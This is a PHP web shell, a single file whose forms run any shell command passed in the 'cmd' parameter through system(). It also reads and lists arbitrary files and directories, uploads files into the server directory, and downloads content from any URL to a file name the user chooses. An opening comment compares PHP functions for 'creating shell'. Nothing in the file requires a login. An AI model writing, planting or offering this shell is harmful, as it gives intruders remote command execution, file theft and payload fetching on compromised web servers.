<!-- 
    Difference between exec, shell_exec, system and passthru for creating shell:
        * exec: Only return the last line of the output (avoid)
        * shell_exec: Return all of the output when the command finish running
        * system: Show output immediately (used for text)
        * passthru: Like system, but used for binary data -->


<html>
<body>
    <b> Terminal </b>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form></br>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
<hr />

    <b>Get files/directory</b></br>
    <b> Current path: <?php echo __FILE__ ?> </b></br></br>
    <form method="GET" action="">
        PATH: <input type="TEXT" name="path" size="80" value= "<?php if (isset($_GET['path'])) {echo $_GET['path'];} ?>">
        <input type="SUBMIT" value="GET">
    </form>

</form>
<pre>
<?php
if (isset($_GET['path'])) {
    if ($_GET['path'] == '') {
        $path = './';
    } else {
        $path = $_GET['path'];
    }
    echo '<b>Realpath:</b> ' . realpath($_GET['path']) . '<br />';
    echo '<b>Type:</b> ';
    if (is_dir($path)) {
        echo 'Directory <br />';
        foreach (scandir($path) as $data) {
            echo $data . "<br />";
        }
    } else {
        echo 'File <br />';
        print_r(file_get_contents($path));
    }
}
?>
</pre>
<hr />
<b>Upload File From Local</b> <br />
<form method="POST" action="" enctype="multipart/form-data">
    File(s): <input type="file" name="uploads[]" multiple="multiple" required="required" />
    <input type="SUBMIT" value="UPLOAD">
</form>
<?php
if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
    $total = count($_FILES['uploads']['name']);
    for ($i = 0; $i < $total; $i++) {
        $tmpPath = $_FILES['uploads']['tmp_name'][$i];
        if ($tmpPath != '') {
            $newPath = './' . $_FILES['uploads']['name'][$i];
            if (move_uploaded_file($tmpPath, $newPath)) {
                echo 'Uploaded: ' .$_FILES['uploads']['name'][$i] . '<br />';
            } else {
                echo 'Failed to upload: ' .$_FILES['uploads']['name'][$i] . '<br />';
            }
        }
    }
}
?>
<hr />
<b> Upload from a URL </b></br>
<form method="POST" action="">
    URL:    <input type="text" name="url" size="80" required="required" />
    Save as: <input type="text" name="savename" size="30" required="required" />
    <input type="SUBMIT" value="UPLOAD">
</form>
<?php
if (isset($_POST['url']) &&isset($_POST['savename'])){
    echo file_get_contents($_POST['url']);
    if (file_put_contents($_POST['savename'],file_get_contents($_POST['url']))){
        echo 'Uploaded' .$_POST['savename'];
    }
    else{
        echo 'Failed to upload:' .$_POST['savename'];
    }
}
?>

</body>
</html>